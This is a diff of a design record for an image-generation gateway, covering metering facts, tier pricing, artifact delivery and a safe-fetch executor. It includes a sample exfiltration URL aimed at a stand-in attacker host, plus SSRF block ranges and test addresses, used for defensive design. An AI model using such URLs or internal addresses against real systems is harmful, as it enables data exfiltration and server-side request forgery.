+| `metering_forms` | the metering forms this call will report on success (§9.1); must include every form in `context.metering_required` | half the job of the four copies of "is this token-priced" (§9.3) |
+| `bounds` | optional **tightening** bounds: `max_images`, `max_tokens{text_input, image_input, output}`, `max_credits` | the xAI branch in `execute.rs:181-187`; the `body_len` approximation in the token bound |
+
+**Bounds: this world's instance of the boundary record §6.3 rule.** The host computes every bound it checks from the
+northbound request, with no provider knowledge. The image instance:
+
+| Bound | Host computation | Do media bytes count? |
+|---|---|---|
+| text input tokens | bytes of the northbound request **excluding** media bytes (the byte length of the elided view, §6.2, plus the multipart text parts) | no |
+| image input tokens | the host-configured allowance × the number of media parts (the view's file parts and elided blobs) | no — each media part counts once, whatever its size |
+| output tokens | the host's authorized output cap × the northbound `n` | — |
+| images | the northbound `n` (the host's own API field, already range-checked at `handlers.rs:133-138`) | — |
+| credits | none: the host has no request-derived credit bound; credit-priced calls are checked only by §9.4 item 5 | — |
+
+Media bytes are excluded because a 20 MiB image counted as text would make the text-input bound meaningless; the
+per-part allowance is what bounds image input. A component may supply `bounds` only to **tighten** them. The
+reservation uses `min(host bound, component bound)`; **every check in §9.4 compares against the host bound only**, so
+a component-supplied number is never used both to reserve and to check that same component. A component that
+tightens too far and then reports more is caught by check 5 (settlement ≤ reservation), not waved through. The
+earlier draft let `prepare.reservation` set both the reservation and the check bound; that made the check exactly as
+strong as the component's honesty. The host defaults today (`image_input_tokens: 0` on
+generation, `execute.rs:175`; `cap` on edits, `handlers.rs:980`) are provider-independent but do not count reference
+images on generation; the allowance per media part replaces them, so a token-priced generation with a reference image
+is not sent to review for reporting image-input tokens.
 
 **Input roles and limits**: the component maps keys to roles (keeping today's "take the first key that appears"
 semantics, `precheck.rs:88-115`) and refuses in `prepare` (`invalid_request`) against the per-role limits declared in
@@ -354,11 +492,33 @@ table (`capabilities.rs:1569-1620`: gpt-image-1 input images 16 / mask 1, xAI 3 
 reference images 1, …) and move into the component with it. The host keeps only provider-independent checks: total
 bytes within the northbound limit (100 MiB, `core/limits.rs:12`).
 
-**Tier refusal for per-image pricing** (replaces `nano_banana_flat_tier_guard`): the host rule becomes generic — "for
-a per-image-priced row, if a tier word reported by `prepare` has no price in that row's price list, 400 before
-admission". The host no longer needs to know which model is Nano Banana. **Cost**: the refusal text becomes generic
-host text, and today's text mentioning "Gemini image token pricing" (`precheck.rs:53-58`) cannot be kept verbatim;
-P22 I4's "400 texts identical item by item" gives way here (accepted by lv on 2026-09-30, §17 Q10).
+**What a tier word is.** A tier word names a **request-time choice** that can differ between two requests to the same
+model row, and that the upstream serves (and usually bills) differently: `resolution` (`1k`, `2k`, `4k`, …) and
+`quality` (`low`, `medium`, `high`, …). It is a fact about the request, not a price, so it stays on the fact side of
+ARCHITECTURE.md's line (`ARCHITECTURE.md:103-116`, which puts "tiers" among host pricing: the host still owns what
+each tier costs). A value **fixed by the model row** is not a tier word: Ideogram's rendering speed is pinned by the
+SKU, never a request parameter (`ideogram.rs:55-72`), so the component derives it from the model and reports no tier.
+The earlier draft listed a `speed` dimension for Ideogram; it is removed, and with it the case in which a generic tier
+rule would have refused every Ideogram request on its single-price row.
+
+**Tier words against today's price columns.** Today no price is keyed by a tier word. Per-image prices are keyed by
+the long edge of the `size` hint (`image_price`, `image_price_1k`, `image_price_2k`, `media.rs:38-50`); xAI's cards
+pick between primary and alternative columns by upstream model family (`media.rs:920-929`). A host price list keyed by
+tier words is therefore a **host schema change** (§17 Q8), and it is a **prerequisite** of every migration step that
+relies on tier words: I2's xAI and I3-2's Nano Banana per-image rows (§14). Until it lands, those rows stay on their
+native arms.
+
+**Tier refusal for per-image pricing** (replaces `nano_banana_flat_tier_guard`, once Q8 has landed): each model
+declares, in `model-capabilities`, its tier dimensions and a default word per dimension (Nano Banana: `resolution`,
+default `1k`). The host rule becomes generic: "for a per-image-priced row, every tier word `prepare` reports must have
+a price in that row's tier-keyed list; a row with **no** tier-keyed list accepts only requests whose tier words all
+equal the model's declared defaults; anything else is a 400 before admission". That reproduces today's gate — a
+single-price Nano Banana row refuses `2k` and accepts `1k` or no resolution (`precheck.rs:47-60`) — without the host
+knowing which model is Nano Banana, and a model with no tier dimensions (MiniMax, Ideogram) is never refused by it.
+When a model declares a `resolution` dimension, the price is selected by the tier word and `size` is not used for
+price selection, so the two facts never pick different columns. **Cost**: the refusal text becomes generic host text,
+and today's text mentioning "Gemini image token pricing" (`precheck.rs:53-58`) cannot be kept verbatim; P22 I4's "400
+texts identical item by item" gives way here (accepted by lv on 2026-09-30, §17 Q10).
 
 **Upstream refused before producing output**: this is not a pre-dispatch fact but an outcome in §9.2, judged by the
 component per dialect. It replaces the host's status-code heuristic of today: `DispatchProbe::upstream_rejected`
@@ -367,60 +527,95 @@ treats only 4xx as "refused before output" (`execute.rs:204-222`), while MiniMax
 **Request body normalisation**: `prepare` produces the upstream request body directly, so normalisation happens inside
 the component; the host reserves and settles using only the `tier` / `size` facts.
 
-**A class of defect removed along the way**: the multipart edit surface today has two refusals that happen **after**
-admission without calling `cancel_pre_dispatch` — `n` failing to parse (`handlers.rs:1103-1113`) and the refusal of
-`stream` (`:1137-1142`) — so the reservation is reclaimed only by the stale sweep after about 120 seconds (the comment
-at `reve.rs:845-846`). Once these validations move into `prepare`, all of them happen before admission. The host
-should still fix them before migration (I0), or the dual run would pin "late refusal" as correct.
+**Late refusals on the multipart edit surface**: the earlier draft listed two refusals that happened after admission
+without releasing the hold (`n` failing to parse and the refusal of `stream`). The host fixed this on 2026-09-30
+(P22-F6, `b8f63414`): all of them now go through `cancel_pre_dispatch` (`handlers.rs:1150`). Moving these validations
+into `prepare` keeps that result and moves them before admission altogether.
 
 ## 9. D6 — Metering facts, pricing form and host generic checks (per P21 DP1)
 
-### 9.1 Metering forms and facts `ImageMeteringV1`
+### 9.1 Metering forms, required facts and evidence facts `ImageMeteringV1`
 
-Closed vocabulary of metering forms: `tokens`, `images`, `credits`, `requests`, `upstream_cost`. Facts (all nullable;
-**null and 0 are different facts**):
+Closed vocabulary of metering forms — the unit a row can be billed in: `tokens`, `images`, `credits`, `requests`.
+Every fact is nullable; **null and 0 are different facts**. Facts come in two kinds, and the difference decides what
+a missing fact does:
 
-| Field | Meaning | Source today |
-|---|---|---|
-| `images_reported` | the output / billed image count the upstream **itself reports**, raw and uncapped | MiniMax `metadata.success_count` (`minimax.rs:186-197`), Bailian `usage.image_count` (`bailian.rs:290-305`) |
-| `tokens` | `{text_input, image_input, cached_text_input, cached_image_input, text_output, image_output, total_input, total_output}` | Gemini `usageMetadata` by modality (`media.rs:146-212`), OpenAI / Azure `usage` (`azure.rs:101-150`) |
-| `credits` | decimal string, ≤ 6 decimal places | Reve `credits_used` (`reve.rs:666-697`) |
-| `upstream_cost` | `{currency: "USD", amount: "<decimal string>"}` | xAI `cost_in_usd_ticks` (1 µ$ = 10,000 ticks, `media.rs:891`), converted by the component into decimal dollars |
+- A **required** fact is one the bill is computed from. Missing on a 2xx → the round is `unknown` (never 0).
+- An **evidence** fact is something the upstream may report that the host uses to check or refine a bill it can
+  compute without it. Missing → `null`, and the host applies its documented fallback. A component must never invent
+  an evidence fact to fill the gap.
 
-`requests` needs no count from the component: the host counts succeeded rounds itself. It appears only as a form,
-saying that the upstream bills per call (the `price_per_request` column GMI uses today, `models.rs:204-210`).
+| Form | Required facts on `succeeded` | Evidence facts (missing → host fallback) | Required on `charged_failure` |
+|---|---|---|---|
+| `tokens` | every token bucket the model declares in `model-capabilities` (below) | — | the same buckets |
+| `images` | none — the host counts delivered primary artifacts | `images_reported` (fallback: the delivered count, as today: `minimax.rs:186-197`, `bailian.rs:290-305`) | `images_reported` (nothing was delivered, so it is the only count) |
+| `credits` | `credits` (decimal string, ≤ 6 decimal places) | — | `credits` |
+| `requests` | none — the host counts succeeded rounds | — | none |
+
+One more evidence fact belongs to no form: `upstream_cost` `{currency: "USD", amount: "<decimal string>"}`, the
+upstream's own quote (xAI `cost_in_usd_ticks`, 1 µ$ = 10,000 ticks, `media.rs:891`, converted by the component into
+decimal dollars with **up to 10 decimal places**, so one tick is representable and the host's exact-match rule in
+§9.4 item 4 loses nothing). It is used only to recognise the served tier; when it is missing the host bills the
+default candidate, as today (`XaiImageTierEvidence::NoReport`, `media.rs:1082`). The earlier draft listed
+`upstream_cost` as a metering form and treated its absence as `unknown`, which would have parked xAI calls that are
+billed correctly today; it was never a unit anything is billed in.
+
+**Token buckets**: `{text_input, image_input, cached_text_input, cached_image_input, cached_input, text_output,
+image_output, total_input, total_output}`. `cached_input` is new: the cached count the upstream reports **without**
+saying whether it is text or image. OpenAI reports exactly that — one undifferentiated cached count
+(`usage_types.rs:363-373`, read at `:393-396`) — and deciding where it goes is a pricing decision the host has already
+made (it is deducted from the text bucket and billed at the cached-text rate, so it can never under-bill). Without the
+bucket, the component would have to make that decision itself. The component reports what the upstream reports and
+the host folds it; how to fold is pricing policy.
+
+**Declared buckets**: in `model-capabilities`, each model declares which buckets its upstream reports (for example
+Gemini: `text_input`, `image_input`, `image_output`, `cached_input`; OpenAI: `text_input`, `image_input`,
+`cached_input`, `total_output`). On a 2xx, **every declared bucket must be non-null**, or the round is `unknown`. This
+closes the partial-report gap the host still has on the image surface: its gates accept any non-zero bucket
+(`ImageTokenUsage::has_usage`, `usage_types.rs:414-419`, used by `require_nano_banana_usage`, `gemini.rs:1001`, and
+the OpenAI-compatible gate, `openai_compat.rs:206`), so a response missing only its output count still settles low —
+the same class the host fixed for token-priced TTS in `a82c852b`. It is a behaviour change, listed in §14.
 
 **The delivered image count is counted by the host, not reported by the component**: the host counts primary
 artifacts. Rules such as "settled count ≤ delivered + 1, otherwise use the delivered count" are host funds policy;
 they stay in the host and apply uniformly to every component. **This is inconsistent with the existing
 `task-wan-image-v2`**: it writes "≤ delivered + 1" into the component (`reference_wan_image_task_v2.rs:10-14`,
-`:129-138`), whereas the contract 6 record says explicitly that this is server policy and stays out of the contract.
-This world follows contract 6's intent; whether the task side reclaims the rule is a separate question (§17 Q9).
-
-The token buckets are finer than the host's today: the host's `ImageTokenUsage` has only text / image / cached (a
-single bucket) / output (`usage_types.rs:360-381`). The component reports what the upstream reports and the host folds
-it itself; how to fold is pricing policy.
+`:129-138`), whereas the contract 6 record says explicitly that this is server policy and stays out of the contract
+(`2026-09-27-task-contract-v6-facts.md:41`). This world follows contract 6's intent; whether the task side reclaims the
+rule is a separate question (§17 Q9).
 
 ### 9.2 Outcome `ImageOutcomeV1` (per round)
 
 | Outcome | Meaning | How the host uses it (today's counterpart) |
 |---|---|---|
-| `succeeded {artifacts, metering, extras}` | there are deliverable artifacts; `metering` must contain every form `prepare` declared | verify the artifacts, then settle (§10) |
-| `rejected {error}` | the upstream explicitly refused: **no output, no charge** | replaces `DispatchProbe.rejected_before_output`; the held path releases the reservation on it (`durable.rs:1283-1292`) |
-| `charged_failure {error, metering}` | the upstream charged but there is no deliverable artifact | Reve settles a policy violation first and then turns it into a 400 (`reve.rs:703-733`); when every Ideogram result is removed by the safety filter, the host today returns 422 and declares no charge, which corresponds to `rejected` (`ideogram.rs:366-381`) |
-| `unknown {reason, error?}` | cannot be decided (5xx, unparsable body, declared metering missing) | `delivery_unknown` / parked for manual review |
+| `succeeded {artifacts, metering, extras}` | there are deliverable artifacts; `metering` carries every required fact (§9.1) of every form in `metering_forms` | verify the artifacts, then settle (§10) |
+| `rejected {error}` | the upstream explicitly refused: **no output, no charge** | replaces `DispatchProbe.rejected_before_output`; releases the reservation under the boundary record §6.4 rule, after the dual run (below) |
+| `charged_failure {error, metering}` | the upstream charged but there is no deliverable artifact | Reve settles a policy violation first and then turns it into a 400 (`reve.rs:703-733`) |
+| `unknown {reason, error?}` | cannot be decided (5xx, unparsable body, a required fact missing, a failed `render`) | `delivery_unknown` / parked for manual review |
 
-**Missing metering is `unknown`, never 0**: if `prepare` declared `tokens` and the upstream returns 2xx without
-usage, the component must return `unknown`. This turns P22-F2's fix (OpenAI-compatible with missing usage → 502,
-`openai_compat.rs:206-222`) into contract, and closes a hole that still settles at $0 today: token-priced Gemini image
-output gets all-zero usage when `usageMetadata` is missing (`media.rs:147-149`; neither of the two call sites,
-generation `gemini.rs:406` and edit `:778`, has a gate).
+**Ideogram "every result removed by the safety filter"** is `rejected`: the upstream says nothing was produced and the
+host today answers 422 with "nothing was billed" (`ideogram.rs:366-381`). Today that 422 is built by the host after a
+2xx, without setting the rejection probe (the probe is set only on the upstream status, `ideogram.rs:340`), so on the
+held path — which Ideogram uses (`durable.rs:767`) — it is parked, not released (`durable.rs:1287-1291`). Under
+`rejected` it would be released. During the dual run each path keeps today's funds behaviour (below), so the dual run
+compares equal; the change takes effect only afterwards and is accepted by a fixture of its own (§14). The
+boundary record §6.4 describes `rejected` as "an upstream 4xx that proves nothing was produced"; here the upstream
+answer is a 2xx that proves the same, which the component recognises per dialect. The outcome is the same, and the
+§6.4 rule applies to it unchanged.
 
-Telling `rejected` from `unknown` is left to the component, but **whether the synchronous path refunds on it is host
-funds policy**. Today the synchronous path records any error after sending as `delivery_unknown`
-(`handlers.rs:662-672`), while the held path releases the reservation on 4xx — the two paths already disagree. This
-world only supplies the facts; during the dual run each path keeps today's behaviour, and afterwards the two are
-unified as "`rejected` releases the reservation" (ruled by lv on 2026-09-30, §17 Q7).
+**Missing metering is `unknown`, never 0**: if a required fact is missing on a 2xx, the component returns `unknown`.
+This turns the host's own gates into contract: P22-F2 (OpenAI-compatible with missing usage → 502,
+`openai_compat.rs:206-222`) and P22-F5 (token-priced Gemini image output without `usageMetadata` → 502; fixed in
+`b8f63414`, `gemini.rs:418` for generation and `:789` for edit — the earlier draft still described this as an open
+$0 hole). The declared-bucket rule of §9.1 goes one step further than those gates.
+
+**Refunds**: telling `rejected` from `unknown` is left to the component; **whether a path refunds on it is host funds
+policy**. Today the synchronous path records any error after sending as `delivery_unknown` (`handlers.rs:662-672`),
+while the held path releases the reservation on a first-round 4xx only (`durable.rs:1287-1291`). During the dual run
+each path keeps that behaviour, which the host can express without provider knowledge (the held path releases a
+`rejected` round only when its upstream status was 4xx). Afterwards the boundary record §6.4 rule applies: a `rejected`
+outcome releases the reservation, on every path and in every world that has the outcome (ruled by lv on 2026-09-30,
+§17 Q7; stated once in the boundary record §6.4).
 
 ### 9.3 Pricing form: the component declares "what it will report", the host keeps a single decision point
 
@@ -434,17 +629,19 @@ and the row can be configured with a per-image price).
 
 So the division is:
 
-- The **component** declares, in `model-capabilities` and `prepare.facts.metering_forms`, **which metering forms it can
-  report** — an upstream fact.
+- The **component** declares, in `model-capabilities`, **which metering forms and token buckets it can report** — an
+  upstream fact — and echoes the forms for this call in `prepare.facts.metering_forms`.
 - The **host** keeps **one single** pricing-form decision function, whose inputs are the catalog row and the
   component's declaration and whose output is per token / per image / per credit / per request; it passes the
   conclusion to `prepare` as `context.metering_required`. If the component cannot report the required form, `prepare`
-  returns a capability error and the host refuses before admission.
-- Collapsing the four copies (`execute.rs:133-137`, `handlers.rs:972-974`, `media.rs:1120-1132`, `gemini.rs:979-986`)
-  into one is the **host's** job. P22-F1's counterexample (a row configured only with
-  `image_cached_image_input_price_per_million`) can also only be solved in the host: `cached_image_input` can be
-  reported on its own in the component's facts; whether to use it, and at what price, is a reading the host pricing
-  function has to add.
+  returns a capability error; if `metering_forms` does not contain every form in `metering_required`, the host refuses
+  before admission.
+- Collapsing the four copies (`execute.rs:137-139`, `handlers.rs:972-974`, `media.rs:1120-1132`, `gemini.rs:982-990`)
+  into one is the **host's** job. Nano Banana's copy is deliberately narrower (no generic-output fallback,
+  `media.rs:1116-1117`), so collapsing it changes which Nano Banana rows count as token-priced; the host has to decide
+  that explicitly. P22-F1's counterexample (a row configured only with `image_cached_image_input_price_per_million`)
+  can also only be solved in the host: `cached_image_input` can be reported on its own in the component's facts;
+  whether to use it, and at what price, is a reading the host pricing function has to add.
 
 `metering_required` has one more use: it lets the component ask the upstream for enough evidence when needed (on the
 speech surface, OpenAI TTS relies on it to decide whether to add `stream_format: "sse"`).
@@ -454,23 +651,27 @@ speech surface, OpenAI TTS relies on it to decide whether to add `stream_format:
 Violating any one → the request is routed to manual review (synchronous path `delivery_unknown`, held path
 `park_held_uncertain`) and is not settled automatically:
 
-1. Structure: `succeeded` must have at least one primary artifact; `metering` covers every form in `metering_forms`.
-2. Internal consistency: `cached_text_input ≤ text_input`, `cached_image_input ≤ image_input`; when buckets and
-   `total_*` both appear, they are equal.
-3. Upper bounds: each token bucket ≤ the bound actually used when reserving (`prepare.reservation.max_tokens` if
-   given, otherwise the host default); `credits ≤ max_credits`. An out-of-bound `images_reported` is **not** routed to
-   review: per the host's image-count policy it falls back to the delivered count (as MiniMax and Bailian do today,
-   `minimax.rs:186-197`).
-4. Tier: `upstream_cost` is used to pick a tier among `tier_candidates` — the default candidate first, then in
-   candidate order, taking the first tier whose upstream list price in the host price list equals the quoted cost; if
-   none match, take `default` and log a warning. This is xAI's behaviour today (`xai.rs:260-293`), written as a
-   provider-independent rule. The bill always follows the host price list, never the upstream quote.
+1. Structure: `succeeded` must have at least one primary artifact; `metering` carries every required fact of every
+   form in `metering_required` (§9.1).
+2. Internal consistency: `cached_text_input ≤ text_input`, `cached_image_input ≤ image_input`,
+   `cached_text_input + cached_image_input + cached_input ≤ text_input + image_input`; when buckets and `total_*` both
+   appear, they are equal.
+3. Upper bounds: each token bucket ≤ the **host** bound of §8 (never the component's own `bounds`); `credits` have
+   no request-derived host bound and are checked by item 5 alone. An out-of-bound `images_reported` is **not** routed
+   to review: it is an evidence fact, and per the host's image-count policy it falls back to the delivered count (as
+   MiniMax and Bailian do today, `minimax.rs:186-197`).
+4. Tier: `upstream_cost`, when present, is used to pick a tier among `tier_candidates` — the default candidate first,
+   then in candidate order, taking the first tier whose upstream list price in the host price list equals the quoted
+   cost; if none match, or `upstream_cost` is null, take `default` and log a warning. This is xAI's behaviour today
+   (`media.rs:1066-1097`, called from `xai.rs:260-293`), written as a provider-independent rule. The bill always follows
+   the host price list, never the upstream quote.
 5. Amount: settlement ≤ reservation (the existing `authorized_max_cost`).
 
 These out-of-bound and internal-consistency checks catch only out-of-bound values and self-contradiction; **they
 cannot catch under-reporting or deviation within the bounds** — the trust boundary DP1 has accepted (the same
 undetectable zone as the boundary record §6.3), covered instead by pinned digests, §12's metering samples and the
-pre-cutover dual run.
+pre-cutover dual run. Because the bounds are the host's own, a component cannot widen the zone by declaring a larger
+bound.
 
 ## 10. D7 — Artifact forms, delivery order and GatewayHeld
 
@@ -479,24 +680,37 @@ pre-cutover dual run.
 | Form | Description | Example |
 |---|---|---|
 | `inline {pointer, encoding, media_type}` | a string in the response view (usually already elided); `encoding` is `base64` / `data_url` | Azure, Stability, Gemini, OpenAI b64 |
-| `body {media_type}` | the whole response body is the image (`binary` framing) | Reve returning binary per `Accept` |
-| `url {url, media_type?}` | an absolute https URL from the upstream, ≤ 8 KiB (same value as `MAX_ARTIFACT_REF_BYTES`) | MiniMax, Bailian, Ideogram |
+| `body {media_type}` | the whole response body is the image (`binary` body form) | an upstream returning image bytes per `Accept` (no current arm on this surface; the Reve bridge pins `Accept: application/json`, `reve.rs:572`) |
+| `url {pointer, media_type?}` | a JSON Pointer into the **unelided** upstream response view, landing on a string: an absolute https URL ≤ 8 KiB (same value as `MAX_ARTIFACT_REF_BYTES`) | MiniMax, Bailian, Ideogram |
 
-The component declares `media_type`. This fixes a host hard-code along the way: when the held path stores b64
-artifacts, the content-type is always written as `image/png` (`durable.rs:1416`), and URL artifacts without a
-content-type also fall back to `image/png` (`:1456`); Gemini's `inlineData` carries its own `mimeType`, which is
-dropped today. The first version has no artifact roles: the image surface has no companion artifacts, and task
-contract 7's rule is not to reserve values that have no consumer.
+**Why `url` is a pointer, not a URL.** The earlier draft let the component write the URL itself. The host then fetches
+that URL (b64 delivery, held storage), so a component could have made the host request
+`https://attacker.example/?q=<prompt>` — a network egress channel out of a sandbox that has no network, which
+`endpoint_confinement` (it checks only the descriptor path) does not close and the safe fetch rules of §11 (which stop
+SSRF, not exfiltration) do not either. With a pointer, the host reads the string from the upstream's own response; the
+component chooses which of the upstream's URLs is the artifact, never what the URL is. Every image arm that answers
+with a URL carries it verbatim in its JSON body, so nothing is lost. The speech world uses the same form,
+`url {pointer, media_type}` (speech §6), so the rule holds in every media world. The same risk exists wherever a
+task-world component names a URL the host later fetches; that is outside this record (inferred; not assessed here).
+
+The component declares `media_type`. Today the held path sniffs b64 artifacts from their leading bytes and falls back
+to `image/png` (P22-F7, `b8f63414`, `durable.rs:1418`), and URL artifacts without a content-type also fall back to
+`image/png` (`durable.rs:1456-1459`); Gemini's `inlineData` carries its own `mimeType`, which is dropped today. The
+component's declaration replaces the fallback; the host may keep sniffing as a generic consistency check (a mismatch is
+logged; the declared type is delivered). `sniff_image_mime` lives in `gemini.rs` today and has to move to a neutral
+place before the Gemini arm is deleted. The first version has no artifact roles: the image surface has no companion
+artifacts, and task contract 7's rule is not to reserve values that have no consumer.
 
 ### 10.2 Delivery order: verify-then-settle (DI6 = A)
 
-`render`'s template decides whether each artifact is delivered as `b64_json` or as `url`. Host obligations:
+`render`'s template decides whether each artifact is delivered as `b64_json` or as `url` (within the table of §7).
+Host obligations:
 
 1. Artifacts the template delivers as **bytes** must be obtained and verified before settlement: an `inline` artifact
    decodes successfully and is non-empty; a `url` artifact is fetched successfully by the safe fetch executor of §11,
    non-empty and within the limit.
-2. Any failure → `delivery_unknown` (parked for manual review; neither charged in full nor refunded automatically),
-   and **no** `finalize`.
+2. Any failure — including a `render` failure after the upstream succeeded (§7) → `delivery_unknown` (parked for
+   manual review; neither charged in full nor refunded automatically), and **no** `finalize`.
 3. Only after all pass: `finalize`, then fill in the template and deliver.
 
 This changes Ideogram's behaviour today: it `finalize`s first (`ideogram.rs:473`) and downloads afterwards (`:493`); if
@@ -509,14 +723,15 @@ as today.
 
 Today the held path has an in-process background task call **the same native arms** (`prepare_held_arm` / `HeldArm`,
 `durable.rs:726-737`, `:802-884`), with a 120-second lease renewed every 30 seconds (`:711-712`), and orphans turned
-into `status_unknown` by `sweep_gateway_held_orphans` (`repo/reconcile.rs:79-133`). This world's commitments to it:
+into `status_unknown` by `sweep_gateway_held_orphans` (`repo/reconcile.rs:90`). This world's commitments to it:
 
 - `model-capabilities`, `prepare`, `parse-response` and `render` are all pure functions with no clock and no
   randomness, and `state` is bounded and serializable: the host can write `prepare`'s result together with its facts
   into the task snapshot before returning 202, and the background task then sends, parses and renders **step for step
-  the same** as the synchronous path.
+  the same** as the synchronous path. Reference expansion and body encoding also happen before the 202 (§6.3).
 - The mapping from outcomes to held terminal states is host-generic: `succeeded` → `finish_held_success` (store first,
-  then write the terminal state); `rejected` → `finish_held_failure`; `charged_failure` → a failed terminal state after
+  then write the terminal state); `rejected` → `finish_held_failure` (during the dual run only when the round's
+  upstream status was 4xx, otherwise `park_held_uncertain`, §9.2); `charged_failure` → a failed terminal state after
   settlement; `unknown` or a failed check → `park_held_uncertain`.
 - Held storage always needs the bytes, so every artifact on the held path goes through §10.2's verification. Storing
   `url` artifacts today already uses the safe fetch client, sends `Accept: image/*`, and writes to disk within
@@ -525,24 +740,27 @@ into `status_unknown` by `sweep_gateway_held_orphans` (`repo/reconcile.rs:79-133
   needed.
 
 The per-type list in `held_arm_is_wired` (`durable.rs:761-777`) becomes "the model row has an image component route";
-which comes first between it and the task world's `component_dispatch_for` (`handlers.rs:169-202`) must be pinned by
-host tests — a host obligation, listed in §12.3.
+which comes first between it and the task world's component route (`component_dispatch_for`, called at
+`handlers.rs:169-173`) must be pinned by host tests — a host obligation, listed in §12.3.
 
 ## 11. D8 — The safe fetch executor (shared by the image and speech second hops, DV2)
 
 An absolute-URL second hop is not a provider call. South's `GetRequestV1` accepts only relative paths under the bound
 endpoint, and 0.26.0 already states that such fetches "neither can go through South at all … host artifact fetches"
 (`2026-09-09-buffered-binary-response.md:180-182`). So execution is in the host; this world sets the **rules**, and the
-component supplies only the URL and the expected media type.
+component supplies only a pointer to the upstream's URL (§10.1) and the expected media type.
 
 **Host obligations (a single executor, shared by image and speech)**:
 
 1. `https` only; refuse userinfo; a host name is required; refuse `localhost` and `*.localhost`.
 2. Resolve DNS before connecting (with a timeout); if **any** resolved address falls in a forbidden range, refuse
    outright; then pin the connection to the checked address.
-3. The forbidden ranges include at least: loopback, RFC 1918 private, link-local (including the `169.254.169.254`
-   metadata address), unspecified, broadcast, multicast, `100.64/10`, `0/8`, `192.0.0/24`, `198.18/15`, `240/4`; IPv6
-   loopback, unspecified, multicast, `fc00::/7`, `fe80::/10`; v4-mapped addresses are rechecked as IPv4.
+3. The forbidden ranges include at least: IPv4 loopback, RFC 1918 private, link-local (including the
+   `169.254.169.254` metadata address), unspecified, broadcast, multicast, `100.64/10`, `0/8`, `192.0.0/24`,
+   `198.18/15`, `240/4`; IPv6 loopback, unspecified, multicast, `fc00::/7`, `fe80::/10`, the deprecated site-local
+   `fec0::/10`; and every IPv6 form that **embeds** an IPv4 address, whose embedded address is rechecked as IPv4:
+   v4-mapped `::ffff:0:0/96`, v4-compatible `::/96`, NAT64 `64:ff9b::/96` and `64:ff9b:1::/48`, and 6to4 `2002::/16`
+   (the IPv4 address in bits 16–47). On a network with a NAT64 gateway, `64:ff9b::a00:1` reaches `10.0.0.1`.
 4. Do not follow redirects (3xx is a failure); **disable the system proxy** (behind a proxy, the proxy re-resolves and
    the address pin is void — exactly the server E-1 gap).
 5. Attach no credential headers and no cookies; send only `Accept`.
@@ -552,19 +770,22 @@ component supplies only the URL and the expected media type.
    neither the image second hop nor the Bailian TTS second hop validates it).
 
 The server's current `guarded_asset_client` (`webhook_sender.rs:491-513`, forbidden ranges `domain.rs:1346-1378`)
-already satisfies 1–6, and additionally allows only ports 443 / 8443. It has a development escape hatch,
+satisfies 1, 2, 4, 5 and 6, and additionally allows only ports 443 / 8443. For item 3 it rechecks v4-mapped addresses
+only (`domain.rs:1366-1369`); the v4-compatible, NAT64, 6to4 and `fec0::/10` rows are new host work before the
+`south.safe-fetch.v1` suite can pass. It has a development escape hatch,
 `asset_fetch_unsafe_allow_private_destinations`: when enabled it allows http and skips DNS pinning. That is host
 configuration; this world's obligation is that **production must not enable it**, and the host is advised to refuse
 it for the production profile in its startup gate. South's own reqwest transport has long used `.no_proxy()` +
-`Policy::none()` (`south-transport-reqwest/src/lib.rs:92-96`); the rules point in the same direction.
+`Policy::none()` (`south-transport-reqwest/src/lib.rs:95-96`); the rules point in the same direction.
 
 **D8b — what South provides (recommended)**: two pure functions plus a set of test vectors; execution stays in the
 host. `ArtifactUrlV1::parse` (scheme, userinfo, host, length — the same shape as `ProviderEndpointV1::parse`'s checks
 on an endpoint, `lib.rs:427-458`) and `is_forbidden_egress_address(IpAddr) -> bool`; plus a host-obligation suite
 `south.safe-fetch.v1` (gate ③) that uses an injectable resolver and transport to assert that these vectors are all
-refused: http, userinfo, `127.0.0.1`, `169.254.169.254`, a domain resolving to a private range, `::ffff:10.0.0.1`, a
-302 to an internal address, and a proxy environment. Both hosts then execute one rule set, instead of each writing one
-and each missing something. Acceptance is for the south maintainers to decide (§17 Q6).
+refused: http, userinfo, `127.0.0.1`, `169.254.169.254`, a domain resolving to a private range, `::ffff:10.0.0.1`,
+`::10.0.0.1`, `64:ff9b::a00:1`, `2002:a00:1::1`, `fec0::1`, a 302 to an internal address, and a proxy environment.
+Both hosts then execute one rule set, instead of each writing one and each missing something. Acceptance is for the
+south maintainers to decide (§17 Q6).
 
 ## 12. D9 — Conformance suite `south.image-component.v1` and host obligations
 
@@ -577,56 +798,66 @@ determinism, unknown-field tolerance, `task_suite_v2.rs:125-218`), plus these **
 | Check | Requirement |
 |---|---|
 | `metering_sample` | for every metering form the component declares, at least one `response` fixture gives **exact** metering facts with `succeeded` |
-| `missing_meter_is_not_zero` | for every form carried in the response body (`tokens` / `credits` / `images_reported` / `upstream_cost`), at least one 2xx fixture missing that field, whose outcome must be `unknown` |
+| `missing_meter_is_not_zero` | for every **required** fact the component can report (`credits`, `images_reported` on `charged_failure`) and for every declared token bucket, at least one 2xx fixture missing it, whose outcome must be `unknown` |
+| `evidence_absent_is_null` | for every **evidence** fact the component can report (`images_reported` on `succeeded`, `upstream_cost`), at least one 2xx fixture missing it, whose outcome is `succeeded` with that fact `null` — never a filled-in number |
 | `terminal_only_from_the_wire` | at least one non-2xx fixture; no non-2xx may produce `succeeded` |
+| `auth_errors_are_not_retriable` | a `401` / `403` fixture whose outcome's error is not retriable (the existing `AuthErrorsAreNotRetriable` variant, `report.rs:57-63`); it applies here because error mapping is merged into `parse-response` |
 | `pre_dispatch_refusal` | for every input role with a declared limit, at least one over-limit `prepare` fixture that returns `invalid_request` and produces no descriptor |
-| `reference_integrity` (a structural check, run on every output) | every `$south.ref` points to a blob that exists in the view; every `$south.artifact` points to an existing artifact; an `inline` pointer lands on a string; no output string exceeds the fallback threshold (the component must not smuggle bytes out of the sandbox) |
+| `reference_integrity` (a structural check, run on every output) | every `$south.ref` points to a blob that exists in the view; no `$south.blob` node appears in any output; every `$south.artifact` points to an existing artifact and uses an allowed delivery (§7); every `inline` and `url` pointer lands on a string in the response view; no output string exceeds the fallback threshold (the component must not smuggle bytes out of the sandbox) |
 | `endpoint_confinement` | the descriptor's `path` is relative and passes the grammar |
 
-`CheckV1` is a closed enum (`report.rs:19-64`); a new check is a new variant, an additive change to the conformance
-crate.
+`CheckV1` is a closed enum (`report.rs:19-64`); `TerminalOnlyFromTheWire`, `EndpointConfinement` and
+`AuthErrorsAreNotRetriable` already exist, and each other check is a new variant, an additive change to the
+conformance crate.
 
 **On "south has not a single usage sample"**: P21 S5's statement is inaccurate — existing fixtures under
